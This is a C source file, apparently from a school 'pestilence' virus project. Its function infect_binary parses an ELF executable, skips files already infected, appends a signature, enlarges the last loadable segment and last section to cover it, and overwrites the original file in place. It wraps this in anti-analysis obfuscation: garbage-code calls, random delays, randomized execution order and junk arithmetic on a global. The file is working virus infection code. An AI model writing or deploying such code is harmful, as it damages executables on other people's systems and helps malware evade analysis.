/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   injector.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/07 16:03:22 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:24:24 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

static int write_infected_file(const char *filepath, void *data, size_t size)
{
    int fd;
    ssize_t written;
    struct stat st;
    mode_t original_mode = 0644;
    
    if (stat(filepath, &st) == 0) {
        original_mode = st.st_mode;
    }
    fd = custom_open(filepath, O_WRONLY | O_TRUNC);
    if (fd < 0)
        return -1;
    written = custom_write(fd, data, size);
    fchmod(fd, original_mode);
    custom_close(fd);
    if (written < 0 || (size_t)written != size)
        return -1;
    return 0;
}

int infect_binary(const char *filepath)
{
    t_elf elf = {0};
    const char *sig;
    size_t sig_len;
    void *new_data = NULL;
    size_t new_size;
    size_t original_size;
	long long save;
    Elf64_Ehdr *new_ehdr;
    save = pepino;
    Elf64_Phdr *new_phdr;
    Elf64_Shdr *new_shdr;
    int ret = -1;
	insert_garbage();

	int order = get_execution_order();
	pepino *= 11;
    if (order == 0 || order == 1) {
        if (parse_elf(filepath, &elf) < 0)
            return -1;
        insert_garbage3();
    }
	pepino += 23432;
    if (order == 2 || order == 3) {
        sig = get_signature();
        sig_len = strlen(sig) + 1;
        random_delay();
    }
	pepino += 234;
	if (order == 2 || order == 3) {
        if (parse_elf(filepath, &elf) < 0)
            return -1;
        insert_garbage4();
    }
    
	if (order == 0 || order == 1) {
        sig = get_signature();
        sig_len = strlen(sig) + 1;
        insert_garbage2();
    }

	insert_garbage4();
    
    if (is_infected(&elf)) {
        cleanup_elf(&elf);
        return 0;
    }

	random_delay();

    original_size = elf.size;
    
    new_size = original_size + sig_len;
    new_data = malloc(new_size);
    if (!new_data) {
        cleanup_elf(&elf);
        return -1;
    }
    
	insert_garbage5();

    memcpy(new_data, elf.data, original_size);
    
    cleanup_elf(&elf);
    
    memcpy((char *)new_data + original_size, sig, sig_len);
    
    new_ehdr = (Elf64_Ehdr *)new_data;
    new_phdr = (Elf64_Phdr *)((char *)new_data + new_ehdr->e_phoff);
    new_shdr = (Elf64_Shdr *)((char *)new_data + new_ehdr->e_shoff);
    
    for (int i = 0; i < new_ehdr->e_phnum; i++) {
        if (new_phdr[i].p_type == PT_LOAD) {
            if (new_phdr[i].p_offset + new_phdr[i].p_filesz == original_size) {
                new_phdr[i].p_filesz += sig_len;
                new_phdr[i].p_memsz += sig_len;
                break;
            }
        }
    }
    int last_section = -1;
    size_t max_offset = 0;
    for (int i = 0; i < new_ehdr->e_shnum; i++) {
        size_t section_end = new_shdr[i].sh_offset + new_shdr[i].sh_size;
        if (section_end > max_offset && section_end <= original_size) {
            max_offset = section_end;
            last_section = i;
        }
    }
    
	insert_garbage5();

    if (last_section >= 0) {
        new_shdr[last_section].sh_size += sig_len;
    }
    
    ret = write_infected_file(filepath, new_data, new_size);
    
    free(new_data);
    pepino = save;
	pepino *= 1;
    return ret;
}